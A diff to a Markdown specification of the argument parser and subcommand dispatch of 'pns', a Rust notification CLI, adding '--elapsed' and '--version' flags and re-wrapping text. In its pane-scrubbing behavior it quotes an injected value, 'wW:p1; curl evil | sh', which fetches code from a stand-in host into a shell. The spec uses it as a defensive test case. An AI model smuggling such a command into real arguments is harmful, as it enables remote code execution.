@@ -3,16 +3,16 @@
 ## Scope
 
 This file specifies the frozen compatibility contract of `pns`'s producer invocation: the deliberately
-lenient argv parser in `src/args.rs`, the ten producer flags it recognizes, the two help spellings, the
-top-level dispatch in `src/main.rs:main` that decides whether an argv is a producer invocation or a
-mistyped subcommand, the subcommand table printed by `const USAGE`, and the four hand-typed verbs whose
-argv shapes callers outside this crate depend on (`pns <harness>-hook`, `pns gate <harness>-hook`,
-`pns loop begin|end`, `pns pulse <exit-code>`). It does not specify what a delivered event renders as,
-which channels exist, how the decision ring or the journal are written, or any behavior of the daemon,
-the lamps, the home probe or the router beyond the argv that reaches them. Everything asserted here is
-derived from the code in this crate and the tests in `src/args.rs`, `src/lights.rs`, `src/pulse.rs`,
-`tests/dispatch.rs` and `tests/hooks.rs`; anything a reader might expect and that no code or test
-establishes is written as a `NOT ESTABLISHED:` line rather than guessed.
+lenient argv parser in `src/args.rs`, the ten legacy producer flags plus elapsed timing, the help and
+version spellings, the top-level dispatch in `src/main.rs:main` that decides whether an argv is a
+producer invocation or a mistyped subcommand, the subcommand table printed by `const USAGE`, and the four
+hand-typed verbs whose argv shapes callers outside this crate depend on (`pns <harness>-hook`,
+`pns gate <harness>-hook`, `pns loop begin|end`, `pns pulse <exit-code>`). It does not specify what a
+delivered event renders as, which channels exist, how the decision ring or the journal are written, or
+any behavior of the daemon, the lamps, the home probe or the router beyond the argv that reaches them.
+Everything asserted here is derived from the code in this crate and the tests in `src/args.rs`,
+`src/lights.rs`, `src/pulse.rs`, `tests/dispatch.rs` and `tests/hooks.rs`; anything a reader might expect
+and that no code or test establishes is written as a `NOT ESTABLISHED:` line rather than guessed.
 
 ## The flag table
 
@@ -32,18 +32,43 @@ knows.
 | `--local-only`   | no argument                              | Not applicable, it takes no value                                                             | Not applicable, it consumes nothing                                            | `tests/dispatch.rs:local_only_keeps_the_banner_and_reaches_nothing_off_the_machine`                                                                       |
 | `--remote-only`  | no argument                              | Not applicable, it takes no value                                                             | Not applicable, it consumes nothing                                            | `tests/dispatch.rs:remote_only_delivers_through_hermes_alone`                                                                                             |
 | `--long-running` | no argument                              | Not applicable, it takes no value                                                             | Not applicable, it consumes nothing                                            | `src/args.rs:the_long_running_flag_is_protected_from_being_eaten_like_every_other_one`                                                                    |
+| `--elapsed`      | nonnegative whole seconds, fitting `u64` | refuse with exit 2, without an event                                                          | refuse a nondecimal or overflowing value                                       | `tests/producer_timing.rs`                                                                                                                                |
 | `--help`, `-h`   | no argument                              | Not applicable, it takes no value                                                             | Not applicable, it consumes nothing                                            | `tests/dispatch.rs:the_help_flag_prints_the_usage_and_reaches_nothing_at_all`                                                                             |
 
-The two lists behind the table are `src/args.rs:VALUE_FLAGS` (the seven value-taking flags) and
+The two lists behind the table are `src/args.rs:VALUE_FLAGS` (the eight value-taking flags) and
 `src/args.rs:BARE_FLAGS` (`--long-running`, `--local-only`, `--remote-only`). `--help` and `-h` are
 deliberately in NEITHER list: `src/args.rs:is_help_flag` answers them separately, which is what keeps
 `--agent --help` an agent literally named `--help` rather than a warn-and-drop
 (`src/args.rs:help_in_value_position_is_still_just_a_value`).
 
+## Elapsed timing and version
+
+`--elapsed <secs>` applies the producer duration policy in `pns-domain`: below 30 seconds it returns
+silently before configuration, state or probes; from 30 seconds it uses the existing presence and
+destination rules; from 300 seconds it also selects the existing long-running tier. It appends
+` (<secs>s)` to a supplied detail, or uses `<secs>s` when detail is empty. It does not change the state,
+channel or narrowing flags. Calls without `--elapsed` retain their detail and tier.
+
+Missing, negative, fractional, nondecimal and overflowing seconds refuse with exit 2 and
+`pns: --elapsed requires a nonnegative whole number of seconds` on stderr. A later valid value does not
+erase an earlier refusal. `--elapsed` together with `--long-running`, in either order, refuses with exit
+2 and `pns: --elapsed cannot be combined with --long-running`. No event is dispatched. Help in flag
+position still wins before these refusals. Existing legacy value-position help and warn-and-ignore
+behavior remain unchanged.
+
+`--version` and `-V` as the first argument exit 0 with the Cargo package version and one newline on
+stdout, no stderr, configuration load or probes. `0.1.0` is the first emitted version supporting
+`--elapsed`; it is the explicit minimum for the released pns.nvim plugin's configuration. Earlier
+binaries carried that package version internally but answered `--version` with usage and exit 2. The
+plugin's health check is advisory and its reporting call still emits elapsed seconds.
+
+This delivery supplies the flag prerequisite only. The shell begin/end and Bash notifier migration remain
+owned by the rest of plan row 8.3; the existing shell callers still use their legacy tier.
+
 ## The usage text, verbatim
 
-`const USAGE` in `src/main.rs` is one text printed on request and on a refusal, because an operator who
-mistyped and an operator who asked have the same question. It is the contract, reproduced exactly:
+`const USAGE` in `src/invocation.rs` is one text printed on request and on a refusal, because an operator
+who mistyped and an operator who asked have the same question. It is the contract, reproduced exactly:
 
 ```text
 pns: usage:
@@ -64,9 +89,10 @@ pns: usage:
   pns doctor                       one test send through every channel
   pns home                         one reading of the router, said out loud
   pns --help, -h                   this text
+  pns --version, -V                the package version
 
 producer flags: --agent <name> --state <word> --project <name> --branch <name>
-                --detail <text> --pane <id> --channel <route>
+                --detail <text> --pane <id> --channel <route> --elapsed <secs>
                 --local-only --remote-only --long-running
 ```
 
@@ -109,23 +135,23 @@ Enumerated by `grep -rn 'libexec/pns/pns'` over the repository, excluding `.git`
 
 Producer invocations (the contract this file specifies):
 
-| Caller                                                                                 | Command line                                                                                                                                   |
-| -------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
-| `dot_bashrc.tmpl:576`                                                                  | `"$pns_engine" --long-running --agent shell --state "$state" --project "${PWD##*/}" --detail "$cmd ($dur)" --pane "${HERDR_PANE_ID:-}"`        |
-| `dot_bashrc.tmpl:580`                                                                  | `"$pns_engine" --agent shell --state "$state" --project "${PWD##*/}" --detail "$cmd ($dur)" --pane "${HERDR_PANE_ID:-}"`                       |
-| `dot_local/libexec/unattended-upgrades/helpers/log-entries.sh:517`                     | `"$pns_script" --remote-only --channel "$UNATTENDED_LOG_ROUTE" --agent "$agent" --state "$state" --project "$project" --detail "$detail" 9>&-` |
-| `dot_local/libexec/unattended-upgrades/helpers/log-entries.sh:556`                     | `"$pns_script" --agent "$agent" --state log-channel-broken --project "$(unattended_log_host)" --detail "$(printf ...)" 9>&-`                   |
-| `dot_local/libexec/unattended-upgrades/executable_homebrew-weekly-upgrade.sh:137`      | `"$ENGINE" --agent homebrew-weekly-upgrade --state "$state" --project "$(unattended_log_host ...)" --detail "$detail" 9>&-`                    |
-| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:464`   | `"$relay_script" --agent update-skills --state exhausted --project skills --detail "$detail" 9>&-`                                             |
-| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2039`  | `"$relay_script" --agent update-skills --state build-failed --project skills ...`                                                              |
-| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2048`  | `"$relay_script" --agent update-skills --state validation-failed --project skills ...`                                                         |
-| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2656`  | `"$relay_script" --agent update-skills --state prereq-missing --project hermes-superpowers ...`                                                |
-| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2675`  | `"$relay_script" --agent update-skills --state routing-drift --project hermes-superpowers ...`                                                 |
-| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2709`  | `"$relay_script" --agent update-skills --state prereq-missing --project hermes ...`                                                            |
-| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2741`  | `"$relay_script" --agent update-skills --state hermes-blocked --project "$profile/$lock_key" ...`                                              |
-| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2752`  | `"$relay_script" --agent update-skills --state hermes-update-failed --project "$profile/$lock_key" ...`                                        |
-| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:3098`  | `"$relay_script" --agent update-skills --state "$state" --project "$fork" --detail "$detail" 9>&-`                                             |
-| `scripts/cutover-gate.sh:1012`                                                         | `"$relay" --agent cutover-gate --state 'done' --project cutover --detail "$note"`                                                              |
+| Caller                                                                                | Command line                                                                                                                                   |
+| ------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
+| `dot_bashrc.tmpl:576`                                                                 | `"$pns_engine" --long-running --agent shell --state "$state" --project "${PWD##*/}" --detail "$cmd ($dur)" --pane "${HERDR_PANE_ID:-}"`        |
+| `dot_bashrc.tmpl:580`                                                                 | `"$pns_engine" --agent shell --state "$state" --project "${PWD##*/}" --detail "$cmd ($dur)" --pane "${HERDR_PANE_ID:-}"`                       |
+| `dot_local/libexec/unattended-upgrades/helpers/log-entries.sh:517`                    | `"$pns_script" --remote-only --channel "$UNATTENDED_LOG_ROUTE" --agent "$agent" --state "$state" --project "$project" --detail "$detail" 9>&-` |
+| `dot_local/libexec/unattended-upgrades/helpers/log-entries.sh:556`                    | `"$pns_script" --agent "$agent" --state log-channel-broken --project "$(unattended_log_host)" --detail "$(printf ...)" 9>&-`                   |
+| `dot_local/libexec/unattended-upgrades/executable_homebrew-weekly-upgrade.sh:137`     | `"$ENGINE" --agent homebrew-weekly-upgrade --state "$state" --project "$(unattended_log_host ...)" --detail "$detail" 9>&-`                    |
+| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:464`  | `"$relay_script" --agent update-skills --state exhausted --project skills --detail "$detail" 9>&-`                                             |
+| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2039` | `"$relay_script" --agent update-skills --state build-failed --project skills ...`                                                              |
+| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2048` | `"$relay_script" --agent update-skills --state validation-failed --project skills ...`                                                         |
+| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2656` | `"$relay_script" --agent update-skills --state prereq-missing --project hermes-superpowers ...`                                                |
+| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2675` | `"$relay_script" --agent update-skills --state routing-drift --project hermes-superpowers ...`                                                 |
+| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2709` | `"$relay_script" --agent update-skills --state prereq-missing --project hermes ...`                                                            |
+| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2741` | `"$relay_script" --agent update-skills --state hermes-blocked --project "$profile/$lock_key" ...`                                              |
+| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2752` | `"$relay_script" --agent update-skills --state hermes-update-failed --project "$profile/$lock_key" ...`                                        |
+| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:3098` | `"$relay_script" --agent update-skills --state "$state" --project "$fork" --detail "$detail" 9>&-`                                             |
+| `scripts/cutover-gate.sh:1012`                                                        | `"$relay" --agent cutover-gate --state 'done' --project cutover --detail "$note"`                                                              |
 
 Non-producer callers of the same binary, listed because they share the argv[1] dispatch this contract
 lives inside:
@@ -153,11 +179,12 @@ that producer invocation is not derivable here.
 
 ### 1. Argv is read once, lossily
 
-Given a process invocation with any bytes in argv\
+Given a process invocation with any bytes in argv\\
 
-When `main` starts\
+When `main` starts\\
 
-Then argv is collected once as `Vec<String>` via `std::env::args_os().skip(1)` with `to_string_lossy().into_owned()` on each element, and every later reader works off that one collection.
+Then argv is collected once as `Vec<String>` via `std::env::args_os().skip(1)` with
+`to_string_lossy().into_owned()` on each element, and every later reader works off that one collection.
 
 - Success: a non-UTF-8 argument becomes a replacement-character token, which the lenient parser then
   treats as any other unknown token.
@@ -180,9 +207,10 @@ Then argv is collected once as `Vec<String>` via `std::env::args_os().skip(1)` w
 
 ### 2. A subcommand word is dispatched before the producer check
 
-Given argv whose first token is one of `pulse`, `home`, `quiet`, `doctor`, `recap`, `daemon`, `lights`, `loop`, `nag`, `setup`, `gate`, `hook`, or a word `hooks::is_harness_subcommand` accepts\
+Given argv whose first token is one of `pulse`, `home`, `quiet`, `doctor`, `recap`, `daemon`, `lights`,
+`loop`, `nag`, `setup`, `gate`, `hook`, or a word `hooks::is_harness_subcommand` accepts\\
 
-When `main` runs its dispatch chain\
+When `main` runs its dispatch chain\\
 
 Then that subcommand's mode runs and the producer parser is never reached, whatever else argv carries.
 
@@ -214,9 +242,10 @@ uses a bare extra word and not a producer flag. The ordering claim in behavior 2
 
 ### 3. A word that names no command is refused
 
-Given argv carrying no token that `is_producer_flag` or `is_help_flag` accepts, and whose first token is not a subcommand\
+Given argv carrying no token that `is_producer_flag` or `is_help_flag` accepts, and whose first token is
+not a subcommand\\
 
-When `main` reaches `is_producer_argv`\
+When `main` reaches `is_producer_argv`\\
 
 Then the whole usage text is written to stderr and the process exits 2, having delivered nothing.
 
@@ -243,11 +272,12 @@ Then the whole usage text is written to stderr and the process exits 2, having d
 
 ### 4. A bare invocation is the empty event the contract calls valid
 
-Given argv with no arguments at all\
+Given argv with no arguments at all\\
 
-When `main` reaches `is_producer_argv`\
+When `main` reaches `is_producer_argv`\\
 
-Then `argv.is_empty()` answers true, the parser produces `EventArgs::default()`, and the empty event is rendered and delivered.
+Then `argv.is_empty()` answers true, the parser produces `EventArgs::default()`, and the empty event is
+rendered and delivered.
 
 - Success: the event reaches every planned channel and the process exits 0.
 - Failure sources: conflating "no argv at all" with "argv is the literal empty string" would swallow this
@@ -272,9 +302,9 @@ Then `argv.is_empty()` answers true, the parser produces `EventArgs::default()`,
 
 ### 5. A stray unrecognized token in front of the flags still delivers
 
-Given argv such as `stray --agent claude --state done --detail "a summary"`\
+Given argv such as `stray --agent claude --state done --detail "a summary"`\\
 
-When `is_producer_argv` reads the WHOLE of argv rather than its first token\
+When `is_producer_argv` reads the WHOLE of argv rather than its first token\\
 
 Then the invocation counts as a producer invocation and the event is delivered.
 
@@ -296,11 +326,13 @@ Then the invocation counts as a producer invocation and the event is delivered.
 
 ### 6. Every value flag lands in its own field
 
-Given `--agent claude --state done --project dotfiles --branch main --detail "a summary" --pane wW:p21 --local-only`\
+Given
+`--agent claude --state done --project dotfiles --branch main --detail "a summary" --pane wW:p21 --local-only`\\
 
-When `parse_args` walks the tokens\
+When `parse_args` walks the tokens\\
 
-Then each value reaches its own `EventArgs` field, `local_only` is set, `remote_only` stays false, and no warning is produced.
+Then each value reaches its own `EventArgs` field, `local_only` is set, `remote_only` stays false, and no
+warning is produced.
 
 - Success: `agent`, `state`, `project`, `branch`, `detail`, `pane` and `channel` are exactly the tokens
   that followed their flags, byte for byte.
@@ -322,11 +354,12 @@ Then each value reaches its own `EventArgs` field, `local_only` is set, `remote_
 
 ### 7. A value flag with no value warns and is ignored
 
-Given a value flag as the last token of argv\
+Given a value flag as the last token of argv\\
 
-When `parse_args` peeks and finds nothing\
+When `parse_args` peeks and finds nothing\\
 
-Then it pushes `"<flag> given without a value; ignoring"` onto the warnings and continues, leaving the field empty.
+Then it pushes `"<flag> given without a value; ignoring"` onto the warnings and continues, leaving the
+field empty.
 
 - Success: the field keeps its default (empty), the rest of argv parses normally, and `event_mode` prints
   each warning to stderr prefixed `pns: `.
@@ -349,11 +382,12 @@ Then it pushes `"<flag> given without a value; ignoring"` onto the warnings and 
 
 ### 8. A recognized flag standing in value position is never consumed
 
-Given `--pane --local-only --agent claude`, or `--detail --long-running`, or `--detail --channel log`\
+Given `--pane --local-only --agent claude`, or `--detail --long-running`, or `--detail --channel log`\\
 
-When `parse_args` peeks and `is_producer_flag` accepts the next token\
+When `parse_args` peeks and `is_producer_flag` accepts the next token\\
 
-Then the value flag warns and is ignored WITHOUT consuming that token, so the recognized flag reaches its own arm and still applies.
+Then the value flag warns and is ignored WITHOUT consuming that token, so the recognized flag reaches its
+own arm and still applies.
 
 - Success: `pane` stays empty and `local_only` is true; `detail` stays empty and `long_running` is true;
   `detail` stays empty and `channel` is `log`.
@@ -379,9 +413,9 @@ Then the value flag warns and is ignored WITHOUT consuming that token, so the re
 
 ### 9. An unrecognized token standing in value position IS the value
 
-Given `--agent --bogus`\
+Given `--agent --bogus`\\
 
-When `parse_args` peeks and `is_producer_flag` refuses the next token\
+When `parse_args` peeks and `is_producer_flag` refuses the next token\\
 
 Then the token is taken as the value verbatim and no warning is produced.
 
@@ -402,9 +436,9 @@ Then the token is taken as the value verbatim and no warning is produced.
 
 ### 10. Unknown arguments in flag position are skipped in silence
 
-Given `stray --agent claude --wat`\
+Given `stray --agent claude --wat`\\
 
-When a token reaches the top of the loop and matches no arm\
+When a token reaches the top of the loop and matches no arm\\
 
 Then the catch-all `_ => {}` skips it with no warning and no field change.
 
@@ -425,11 +459,13 @@ Then the catch-all `_ => {}` skips it with no warning and no field change.
 
 ### 11. `--help` and `-h` in flag position print the usage and reach nothing
 
-Given any of `--help`, `-h`, `--agent claude --help`, `--local-only --help`, `-- --help`, `stray --help`\
+Given any of `--help`, `-h`, `--agent claude --help`, `--local-only --help`, `-- --help`,
+`stray --help`\\
 
-When the token reaches the top of `parse_args`'s loop unconsumed\
+When the token reaches the top of `parse_args`'s loop unconsumed\\
 
-Then `parsed.help` is set, and `event_mode` prints `USAGE` to stdout and returns before any config load, any probe, any warning print and any delivery.
+Then `parsed.help` is set, and `event_mode` prints `USAGE` to stdout and returns before any config load,
+any probe, any warning print and any delivery.
 
 - Success: exit 0, `USAGE` on stdout, stderr exactly empty, nothing spawned, no state directory created.
 - Failure sources: help used to fall through the parser as an unknown token, which loaded the config,
@@ -453,11 +489,12 @@ Then `parsed.help` is set, and `event_mode` prints `USAGE` to stdout and returns
 
 ### 12. `--help` in value position is still just a value
 
-Given `--agent --help --state done`, or `--agent claude --state --help`\
+Given `--agent --help --state done`, or `--agent claude --state --help`\\
 
-When `parse_args` reaches the value arm before the help arm sees the token\
+When `parse_args` reaches the value arm before the help arm sees the token\\
 
-Then `--help` is the field's value, `parsed.help` stays false, no warning is produced, and the event is delivered normally.
+Then `--help` is the field's value, `parsed.help` stays false, no warning is produced, and the event is
+delivered normally.
 
 - Success: the delivered event carries `agent == "--help"` or `state == "--help"`.
 - Failure sources: adding `--help` to `is_producer_flag` would flip this into a warn-and-drop, which is
@@ -476,11 +513,12 @@ Then `--help` is the field's value, `parsed.help` stays false, no warning is pro
 
 ### 13. `--local-only` keeps the local surfaces alone
 
-Given `--local-only` on a producer invocation\
+Given `--local-only` on a producer invocation\\
 
-When `routing::channel_plan` filters the selection\
+When `routing::channel_plan` filters the selection\\
 
-Then only plugins whose routing declaration says `local` survive, and the legs run in `ReportMode::Silent`.
+Then only plugins whose routing declaration says `local` survive, and the legs run in
+`ReportMode::Silent`.
 
 - Success: the banner fires; neither the mobile card nor hermes does.
 - Failure sources: a presence-gated plugin is dropped whenever the phone verdict is no, under every flag,
@@ -499,11 +537,12 @@ Then only plugins whose routing declaration says `local` survive, and the legs r
 
 ### 14. `--remote-only` keeps the durable legs alone, synchronously
 
-Given `--remote-only` on a producer invocation\
+Given `--remote-only` on a producer invocation\\
 
-When `routing::channel_plan` filters the selection\
+When `routing::channel_plan` filters the selection\\
 
-Then only plugins whose routing declaration says `durable` survive, and the mode becomes `ReportMode::ReportOutcome`, which is what makes an undelivered log entry visible.
+Then only plugins whose routing declaration says `durable` survive, and the mode becomes
+`ReportMode::ReportOutcome`, which is what makes an undelivered log entry visible.
 
 - Success: hermes fires with `mode == "sync"`; neither the banner nor the mobile card does. The engine
   prints one `pns: ` line naming the outcome, which is the line
@@ -534,11 +573,12 @@ Then only plugins whose routing declaration says `durable` survive, and the mode
 
 ### 15. Both delivery-scope flags together deliver nothing and say so
 
-Given `--local-only --remote-only` on one invocation\
+Given `--local-only --remote-only` on one invocation\\
 
-When `routing::channel_plan` sees both\
+When `routing::channel_plan` sees both\\
 
-Then it returns an empty plan immediately, and `run_event` prints one exact line to stdout because a silent exit is indistinguishable from delivery.
+Then it returns an empty plan immediately, and `run_event` prints one exact line to stdout because a
+silent exit is indistinguishable from delivery.
 
 - Success: stdout carries exactly this line, verbatim:
 
@@ -578,11 +618,12 @@ Then it returns an empty plan immediately, and `run_event` prints one exact line
 
 ### 16. `--long-running` is the tier the lamps ride on
 
-Given `--long-running` on a producer invocation\
+Given `--long-running` on a producer invocation\\
 
-When `decide` is called with `event.long_running`\
+When `decide` is called with `event.long_running`\\
 
-Then `surface::plan` sets `pulse: long_running` unconditionally, and the mobile card is allowed through a watched pane only when `long_running && mobile_watch_card` are both true.
+Then `surface::plan` sets `pulse: long_running` unconditionally, and the mobile card is allowed through a
+watched pane only when `long_running && mobile_watch_card` are both true.
 
 - Success: the event's plan carries a pulse, and with a `[lights]` table and hue enabled the lamps are
   signalled from the engine's own delivery plan rather than from a second call.
@@ -607,11 +648,12 @@ Then `surface::plan` sets `pulse: long_running` unconditionally, and the mobile 
 
 ### 17. `--channel <route>` names a hermes route, never a URL
 
-Given `--channel log`\
+Given `--channel log`\\
 
-When `hermes_url_for` resolves the endpoint\
+When `hermes_url_for` resolves the endpoint\\
 
-Then `PNS_HERMES_URL` wins if set and non-empty; else an empty channel gives `DEFAULT_HERMES_URL` (`http://127.0.0.1:8644/webhooks/pns`); else `channel_url` swaps the final path segment for the route.
+Then `PNS_HERMES_URL` wins if set and non-empty; else an empty channel gives `DEFAULT_HERMES_URL`
+(`http://127.0.0.1:8644/webhooks/pns`); else `channel_url` swaps the final path segment for the route.
 
 - Success: the post goes to `<gateway>/<route>` with the host and port unmoved.
 - Failure sources: a route name `safety::route_name_is_usable` refuses (empty, or anything outside ASCII
@@ -640,9 +682,9 @@ Then `PNS_HERMES_URL` wins if set and non-empty; else an empty channel gives `DE
 
 ### 18. `--pane <id>` is scrubbed when it carries shell metacharacters
 
-Given `--pane "wW:p1; curl evil | sh"` with at least one channel planned\
+Given `--pane "wW:p1; curl evil | sh"` with at least one channel planned\\
 
-When `decide` computes `pane_dropped` and `dispatch_legs` acts on it\
+When `decide` computes `pane_dropped` and `dispatch_legs` acts on it\\
 
 Then the pane is replaced with the empty string in every delivered event and one warning is printed.
 
@@ -669,11 +711,12 @@ Then the pane is replaced with the empty string in every delivered event and one
 
 ### 19. The bare gate spelling `pns <harness>-hook`
 
-Given argv[1] shaped `<name>-hook`, with `<name>` non-empty and all ASCII lowercase\
+Given argv[1] shaped `<name>-hook`, with `<name>` non-empty and all ASCII lowercase\\
 
-When `hooks::is_harness_subcommand` accepts it\
+When `hooks::is_harness_subcommand` accepts it\\
 
-Then `gate_mode` runs: it declines (exit 0) unless moshi is present and the operator is away, then reads the payload from stdin and passes it through to `moshi-hook <name>-hook`.
+Then `gate_mode` runs: it declines (exit 0) unless moshi is present and the operator is away, then reads
+the payload from stdin and passes it through to `moshi-hook <name>-hook`.
 
 - Success: moshi's own exit code is returned. `tests/hooks.rs` stubs moshi at 7 and asserts 7 comes back,
   with the payload arriving on moshi's stdin byte for byte and the argv being exactly `pi-hook`.
@@ -704,9 +747,9 @@ Then `gate_mode` runs: it declines (exit 0) unless moshi is present and the oper
 
 ### 20. The documented gate spelling `pns gate <harness>-hook`
 
-Given argv `gate pi-hook`\
+Given argv `gate pi-hook`\\
 
-When `main` matches `first == "gate"` and calls `gate_mode(&second_argument())`\
+When `main` matches `first == "gate"` and calls `gate_mode(&second_argument())`\\
 
 Then the same gate runs and returns the same decision.
 
@@ -732,11 +775,13 @@ Then the same gate runs and returns the same decision.
 
 ### 21. `pns loop begin|end`
 
-Given argv `loop <verb> [--pane <id>]`\
+Given argv `loop <verb> [--pane <id>]`\\
 
-When `loop_mode` reads the verb from `second_argument()` and the remaining arguments from `args_os().skip(3)`\
+When `loop_mode` reads the verb from `second_argument()` and the remaining arguments from
+`args_os().skip(3)`\\
 
-Then `lights::loop_command` resolves the pane FIRST and the verb SECOND, and the lease marker is written or removed.
+Then `lights::loop_command` resolves the pane FIRST and the verb SECOND, and the lease marker is written
+or removed.
 
 - Success: `begin` writes the lease marker for the pane and registers the lamps' tick for the whole lease
   timeout; `end` removes the marker. Exit 0 in both cases.
@@ -784,11 +829,12 @@ Then `lights::loop_command` resolves the pane FIRST and the verb SECOND, and the
 
 ### 22. `pns pulse <exit-code>`
 
-Given argv `pulse [<word>...]`\
+Given argv `pulse [<word>...]`\\
 
-When `pulse_mode` reads the WHOLE tail via `args_os().skip(2)`\
+When `pulse_mode` reads the WHOLE tail via `args_os().skip(2)`\\
 
-Then help wins anywhere in the tail; a tail longer than one token is refused; the single word is mapped by `pulse::exit_behaviour`; and the pulse fires only if its own table says enabled.
+Then help wins anywhere in the tail; a tail longer than one token is refused; the single word is mapped
+by `pulse::exit_behaviour`; and the pulse fires only if its own table says enabled.
 
 - Success: a bare `pulse` or an all-zeroes code is a success pulse (`config::Behaviour::Done`); any other
   all-digit code is a failure pulse (`config::Behaviour::Failed`). Exit 0.
@@ -829,9 +875,9 @@ Then help wins anywhere in the tail; a tail longer than one token is refused; th
 
 ### 23. Exit codes across the surface
 
-Given any invocation of the binary\
+Given any invocation of the binary\\
 
-When it terminates\
+When it terminates\\
 
 Then the exit code falls into exactly one of four classes.
 
